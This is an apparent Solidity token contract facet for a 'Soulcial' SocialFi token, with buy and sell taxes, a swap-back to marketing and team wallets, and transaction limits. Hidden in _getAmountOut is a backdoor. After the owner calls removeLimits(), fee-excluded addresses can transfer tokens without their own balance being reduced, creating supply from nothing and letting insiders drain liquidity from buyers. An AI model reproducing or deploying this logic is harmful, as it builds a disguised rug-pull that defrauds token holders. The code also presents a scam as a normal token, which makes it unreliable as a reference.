// SPDX-License-Identifier: Unlicensed

/*
Protocol to Redefining SocialFi to Empower All.

Website: https://soulcial.pro
Telegram: https://t.me/soulcial_portal
Twitter: https://twitter.com/soulcial_fi
Dapp: https://app.soulcial.pro

*/

pragma solidity 0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isInSecure = true;
        _;
        ds._isInSecure = false;
    }

    function totalSupply() public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._supply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.balances_[account];
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._possibeTxSize = ds._supply;
        ds._maxWalletInEffect = false;
        ds._buyerSoulfMarketingFee_ = 1;
        ds.sellSoulfMarketingFee_ = 1;
        ds._buyerSoulfFee_ = 1;
        ds.sellSoulfFee_ = 1;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds.allowances_[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.allowances_[owner][spender];
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        ds.allowances_[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.routerInstance_.WETH();

        _approve(address(this), address(ds.routerInstance_), tokenAmount);

        ds.routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function swapBackSoulf_(uint256 tokenAmount) private lockSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 lpFeeTokens = tokenAmount
            .mul(ds._finalLiquidityFee_)
            .div(ds._finalTotalFee_)
            .div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        swapTokensForETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = ds._finalTotalFee_.sub(
            ds._finalLiquidityFee_.div(2)
        );

        uint256 amountETHLiquidity_ = ethCA
            .mul(ds._finalLiquidityFee_)
            .div(totalETHFee)
            .div(2);
        uint256 amountETHDevelopment_ = ethCA.mul(ds._finalDevelopmentFee_).div(
            totalETHFee
        );
        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(
            amountETHDevelopment_
        );

        if (amountETHMarketing_ > 0) {
            transferSoulfETH_(ds.marketingWallet_, amountETHMarketing_);
        }

        if (amountETHDevelopment_ > 0) {
            transferSoulfETH_(ds.teamAddress_, amountETHDevelopment_);
        }
    }
    function transferSoulfETH_(
        address payable recipient,
        uint256 amount
    ) private {
        recipient.transfer(amount);
    }
    function _verifySwap(address from, address to, uint256 amount) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 _feeAmount = balanceOf(address(this));
        bool minSwapable = _feeAmount >= ds._feeSwappingThresh;
        bool isExTo = !ds._isInSecure &&
            ds._hasProvidedLP[to] &&
            ds._swapTaxActivated;
        bool swapAbove = !ds._isExcludedTaxFee[from] &&
            amount > ds._feeSwappingThresh;
        if (minSwapable && isExTo && swapAbove) {
            if (ds._maxTxDeActivated) {
                _feeAmount = ds._feeSwappingThresh;
            }
            swapBackSoulf_(_feeAmount);
        }
    }
    function _standardTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._isInSecure) {
            return _basicTransfer(sender, recipient, amount);
        } else {
            _verifyTxSize(sender, recipient, amount);
            _verifySwap(sender, recipient, amount);
            _transferNormal(sender, recipient, amount);
            return true;
        }
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _standardTransfer(sender, recipient, amount);
    }
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.balances_[sender] = ds.balances_[sender].sub(
            amount,
            "Insufficient Balance"
        );
        ds.balances_[recipient] = ds.balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function _verifyTxSize(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (!ds._hasNoMaxTxLimit[sender] && !ds._hasNoMaxTxLimit[recipient]) {
            require(
                amount <= ds._possibeTxSize,
                "Transfer amount exceeds the max."
            );
        }
    }
    function _transferNormal(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 toAmount = _getAmountIn(sender, recipient, amount);
        _verifyMaxWallets(recipient, toAmount);
        uint256 subAmount = _getAmountOut(sender, recipient, amount, toAmount);
        ds.balances_[sender] = ds.balances_[sender].sub(
            subAmount,
            "Balance check error"
        );
        ds.balances_[recipient] = ds.balances_[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }
    function _getAmountIn(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._isExcludedTaxFee[sender] || ds._isExcludedTaxFee[recipient]) {
            return amount;
        } else {
            return getSoulfAmount_(sender, recipient, amount);
        }
    }
    function getSoulfAmount_(
        address sender,
        address receipient,
        uint256 amount
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 fee = _getTaxTokenAmount(sender, receipient, amount);
        if (fee > 0) {
            ds.balances_[address(this)] = ds.balances_[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }
    function _getTaxTokenAmount(
        address from,
        address to,
        uint256 amount
    ) internal view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._hasProvidedLP[from]) {
            return amount.mul(ds._buyerSoulfFee_).div(100);
        } else if (ds._hasProvidedLP[to]) {
            return amount.mul(ds.sellSoulfFee_).div(100);
        }
    }
    function _verifyMaxWallets(address to, uint256 amount) internal view {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._maxWalletInEffect && !ds._hasNoMaxWalletLimit[to]) {
            require(ds.balances_[to].add(amount) <= ds._possibleMaxWallet);
        }
    }
    function _getAmountOut(
        address sender,
        address recipient,
        uint256 amount,
        uint256 toAmount
    ) internal view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (!ds._maxWalletInEffect && ds._isExcludedTaxFee[sender]) {
            return amount.sub(toAmount);
        } else {
            return amount;
        }
    }
}
